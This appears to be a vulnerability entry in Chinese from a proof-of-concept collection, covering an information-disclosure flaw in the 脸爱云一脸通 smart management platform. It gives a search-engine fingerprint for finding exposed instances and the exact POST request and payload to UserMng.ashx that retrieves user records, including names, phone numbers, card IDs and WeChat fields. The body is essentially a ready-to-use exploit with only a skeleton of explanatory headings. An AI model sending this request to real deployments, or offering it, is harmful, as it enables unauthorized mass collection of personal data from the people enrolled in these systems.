# 脸爱云一脸通智慧管理平台UserMng存在信息泄露漏洞

- **系统**：脸爱云一脸通智慧管理平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
- **请求**：`POST /UserMng.ashx HTTP/1.1`
- **关键头**：`Content-Length: 483`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
page=1&arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo
```

**其他**
- 脸爱云一脸通智慧管理平台UserMng存在信息泄露漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 脸爱云一脸通智慧管理平台